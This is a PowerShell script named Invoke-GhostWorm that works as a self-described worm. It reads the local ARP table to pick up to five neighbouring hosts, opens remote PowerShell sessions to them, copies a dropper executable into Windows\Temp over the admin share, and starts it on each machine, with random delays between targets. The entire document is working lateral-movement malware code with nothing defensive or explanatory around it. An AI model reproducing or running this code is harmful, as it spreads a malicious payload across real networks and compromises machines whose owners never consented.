function Invoke-GhostWorm {
    param (
        [string]$PayloadLocal = "$env:TEMP\Dropper_with_Raven.exe",
        [int]$MaxTargets = 5
    )

    Write-Output "[~] GhostWorm initializing..."

    # Discover local network targets via ARP table
    $targets = arp -a | ForEach-Object {
        if ($_ -match '(\d{1,3}(\.\d{1,3}){3})') {
            $ip = $matches[1]
            if ($ip -ne $null -and $ip -ne "127.0.0.1") {
                return $ip
            }
        }
    } | Select-Object -Unique | Select-Object -First $MaxTargets

    foreach ($target in $targets) {
        try {
            Write-Output "[>] Infecting $target..."

            $adminShare = "\\$target\ADMIN$"
            $remotePath = "$adminShare\TempDropper.exe"

            # Create temp folder if it doesn't exist
            $session = New-PSSession -ComputerName $target -ErrorAction SilentlyContinue
            if ($session) {
                Invoke-Command -Session $session -ScriptBlock {
                    New-Item -Path "C:\Windows\Temp" -ItemType Directory -Force | Out-Null
                }

                # Transfer payload
                Copy-Item -Path $PayloadLocal -Destination "\\$target\C$\Windows\Temp\TempDropper.exe" -Force

                # Launch payload remotely
                Invoke-Command -Session $session -ScriptBlock {
                    Start-Process "C:\Windows\Temp\TempDropper.exe"
                }

                Write-Output "[✓] Deployed to $target."
                Remove-PSSession $session
            }
            else {
                Write-Warning "[!] No PS session with $target"
            }

            Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5)
        }
        catch {
            Write-Warning "[x] Failed on $target: $_"
        }
    }

    Write-Output "[~] GhostWorm sweep complete."
}
